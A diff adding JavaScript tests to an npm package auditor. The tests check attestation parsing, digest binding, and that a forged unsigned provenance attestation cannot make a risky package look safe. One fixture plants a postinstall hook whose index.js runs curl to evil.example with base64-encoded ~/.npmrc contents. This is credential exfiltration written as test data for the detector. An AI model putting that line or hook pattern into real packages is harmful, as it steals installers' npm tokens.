@@ -10,6 +10,7 @@ const {
   parseAttestation,
   compareProvenanceToRepository,
   canonicalGithubKey,
+  verifySubjectDigest,
   _internal
 } = require("../src/attestation");
 const { auditEvidence } = require("../src/auditor");
@@ -296,6 +297,127 @@ test("auditor is silent when package has no attestation", () => {
   const bandNames = report.riskBands.map((b) => b.band);
   assert.ok(!bandNames.includes("provenance-attested"));
   assert.ok(!bandNames.includes("provenance-mismatch"));
+});
+
+// ---- finding 4: parse-only "verification" hardening ----
+
+test("decodePayload caps an oversized DSSE payload (finding 4a)", () => {
+  // Craft an in-toto Statement whose JSON is far larger than the 1MB decoded
+  // cap. decodePayload must refuse it (return null) rather than parse a huge
+  // untrusted blob.
+  const oversized = {
+    predicateType: "https://slsa.dev/provenance/v1",
+    subject: [{ name: "pkg", digest: { sha512: "x".repeat(2 * 1024 * 1024) } }]
+  };
+  const envelope = { payload: encodePayload(oversized) };
+  assert.equal(_internal.decodePayload(envelope), null);
+  // A normal-sized payload still decodes fine.
+  const ok = { predicateType: "https://slsa.dev/provenance/v1", subject: [] };
+  assert.deepEqual(_internal.decodePayload({ payload: encodePayload(ok) }), ok);
+});
+
+test("parseAttestation marks results as NOT cryptographically verified and exposes subject digests (finding 4b)", () => {
+  const synthetic = syntheticSlsaV02Bundle({
+    repoUrl: "https://github.com/example/widget",
+    ref: "refs/tags/v1.0.0",
+    sha: "0123456789abcdef0123456789abcdef01234567",
+    workflowPath: ".github/workflows/publish.yml",
+    builderId: "https://github.com/actions/runner/github-hosted"
+  });
+  const parsed = parseAttestation(synthetic);
+  assert.equal(parsed.cryptographicallyVerified, false, "parse-only result must self-report unverified");
+  assert.ok(Array.isArray(parsed.subjectDigests) && parsed.subjectDigests.length === 1);
+  assert.equal(parsed.subjectDigests[0].digest.sha512, "deadbeef");
+});
+
+test("verifySubjectDigest binds an attestation to the downloaded tarball digest (finding 4b)", () => {
+  const synthetic = syntheticSlsaV02Bundle({
+    repoUrl: "https://github.com/example/widget",
+    ref: "refs/tags/v1.0.0",
+    sha: "abc",
+    workflowPath: ".github/workflows/x.yml",
+    builderId: "anything"
+  });
+  const parsed = parseAttestation(synthetic);
+  // Matching digest (the synthetic subject uses sha512:deadbeef).
+  assert.equal(
+    verifySubjectDigest(parsed, { algorithm: "sha512", value: "DEADBEEF" }),
+    true,
+    "case-insensitive digest match should bind"
+  );
+  // Wrong value → no binding (this is exactly how a tampered artifact would
+  // fail to match an otherwise-parseable attestation).
+  assert.equal(verifySubjectDigest(parsed, { algorithm: "sha512", value: "0000" }), false);
+  // Wrong algorithm → no binding.
+  assert.equal(verifySubjectDigest(parsed, { algorithm: "sha256", value: "deadbeef" }), false);
+  // Missing digest → no binding.
+  assert.equal(verifySubjectDigest(parsed, null), false);
+});
+
+test("a bogus UNSIGNED attestation is info-only and never reduces severity (finding 4c)", () => {
+  // Forge a parseable-but-unsigned SLSA v0.2 bundle for a package that also
+  // has a genuine HIGH-severity risk finding. The attestation must be recorded
+  // at severity:info, must NOT appear as a mismatch, and must NOT pull the
+  // verdict toward safe — the HIGH finding must still drive a non-safe verdict.
+  const forged = syntheticSlsaV02Bundle({
+    repoUrl: "https://github.com/legit/widget",
+    ref: "refs/heads/main",
+    sha: "abc",
+    workflowPath: ".github/workflows/publish.yml",
+    builderId: "https://github.com/actions/runner/github-hosted",
+    withTlog: false // no transparency-log entry at all — definitely unsigned/forged
+  });
+  const primary = parseAttestation(forged);
+  assert.ok(primary);
+  assert.equal(primary.cryptographicallyVerified, false);
+
+  // Baseline: audit WITHOUT the attestation to capture the verdict from the
+  // risk finding alone.
+  const evidenceBase = {
+    packageName: "widget",
+    npmMetadata: {
+      name: "widget",
+      version: "1.0.0",
+      repository: { url: "https://github.com/legit/widget" }
+    },
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "widget",
+        version: "1.0.0",
+        // An install-time hook that runs code — a real risk finding the
+        // auditor flags regardless of provenance.
+        scripts: { postinstall: "node index.js" },
+        repository: "https://github.com/legit/widget"
+      }),
+      "index.js":
+        "const cp = require('child_process');\n" +
+        "cp.exec('curl http://evil.example/$(cat ~/.npmrc | base64)');\n"
+    }
+  };
+
+  const withoutAtt = auditEvidence({ ...evidenceBase });
+  const withAtt = auditEvidence({
+    ...evidenceBase,
+    provenanceAttestation: { attested: true, primary, all: [primary], attestationCount: 1 }
+  });
+
+  const bandNames = withAtt.riskBands.map((b) => b.band);
+  // The forged attestation is surfaced only as an info-severity positive band
+  // (repo matches package.json → not a mismatch).
+  if (bandNames.includes("provenance-attested")) {
+    const band = withAtt.riskBands.find((b) => b.band === "provenance-attested");
+    assert.equal(band.severity, "info", "provenance must stay severity:info");
+  }
+  assert.ok(!bandNames.includes("provenance-mismatch"));
+
+  // The core invariant: adding an unsigned attestation must NOT move the
+  // verdict toward safe. It must be no safer than the no-attestation baseline.
+  const rank = { safe: 0, review: 1, block: 2 };
+  assert.ok(
+    rank[withAtt.verdict] >= rank[withoutAtt.verdict],
+    `unsigned attestation moved verdict toward safe: ${withoutAtt.verdict} -> ${withAtt.verdict}`
+  );
+  assert.notEqual(withAtt.verdict, "safe", "a package with an install-time exfil hook must not be 'safe' just because it carries a parseable attestation");
 });
 
 test("fetchProvenanceAttestation reads/writes the 24h disk cache", async () => {
